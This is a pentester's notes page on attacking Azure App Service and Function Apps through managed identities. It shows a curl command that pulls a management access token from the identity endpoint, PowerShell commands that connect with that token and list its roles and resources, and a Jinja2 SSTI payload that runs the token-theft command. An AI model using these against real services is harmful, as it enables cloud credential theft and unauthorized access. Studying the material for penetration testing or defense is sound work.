---
title: Azure App Service
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/service-discovery-recon-enumeration-and-initial-access-attacks/azure-app-service
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

Azure App Service is an HTTP-based service for hosting web applications, REST APIs, and mobile back ends. It supports both Windows and Linux environments.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FUnvMFYCkyckR1An7E57X%2Fapp-service_image_val2.avif?alt=media&amp;token=01af7645-c1b9-402e-8b67-545d5ab89f4d" alt=""><figcaption></figcaption></figure>

### Isolation

Each app runs inside a sandbox but isolation depends upon App Service plans

* Apps in Free and Shares tiers run on shared VMs
* Apps in standard and premium tiers run on dedicated VMs

### App Service Abuse

While there are default security features available with App Service (sandboxing/isolation), vulnerabilities in the code deployed are abusable. The classic web app vulns like SQL injection, OS command injection, etc do not disappear.

### Managed Identity

By abusing and vulnerability in an app service and it is possible to get command execution, the privileges will be of the low-privilege worker process. But if the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FYQuSrU7v7KcAleMtuxv5%2Farchitecture.png?alt=media&amp;token=2b526605-f698-4231-b054-bb8796a201b7" alt=""><figcaption></figcaption></figure>

Once you have command execution, run `env`to check if the `identity_header`variable and `identity_endpoint`are set. If they are, the app has a managed identity

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FNlEGoZzOnOBYI4zgyAOE%2Fimage.png?alt=media&amp;token=a5ddf29c-70ff-49c8-8f29-38ed6d2d5eb5" alt=""><figcaption></figcaption></figure>

Now, to get a access\_token for the app service, we can use the following command:

{% code lineNumbers="true" %}

```php
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

{% endcode %}

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FupJveYvtUeTafpR0NxAE%2Fimage.png?alt=media&amp;token=340a8e34-6660-4c9e-905d-1b45ca3c9243" alt=""><figcaption></figcaption></figure>

### Check App Privileges

Once you have a access\_token for the app service, use that to connect to Az Cli:

```powershell
Connect-AzAccount -AccessToken $token -AccountID 064aaf57-30af-41f0-840a-xxxxx
```

Now to check which Role Assignments our token has run:

```powershell
Get-AzRoleAssignment
```

To get the available resources run:

```powershell
Get-AzResource
```

### SSTI payload

Found a app vulnerable to SSTI (Jinja2), use this payload to get the app's access\_token:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read() }}
```

### Function App

A function app (also called Azure Functions), is Azure's 'serverless' solution to run code. A function app is supposed to be used to react to an event like:

* HTTP Trigger
* Processing a File upload
* Run code on a scheduled time and more

Function apps also support managed identities!

It looks a lot like AWS Lambda

When you get the following error , it means the access\_token has to access to any resources:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FY4CBADE3zw0iCbUXtiZf%2Fimage.png?alt=media&amp;token=13cd68b3-7bf2-462f-a53f-55cf0895f27f" alt=""><figcaption></figcaption></figure>

By default, managed identities (service principals), have no read access at all!

In this case, something like AzureHound comes in handy
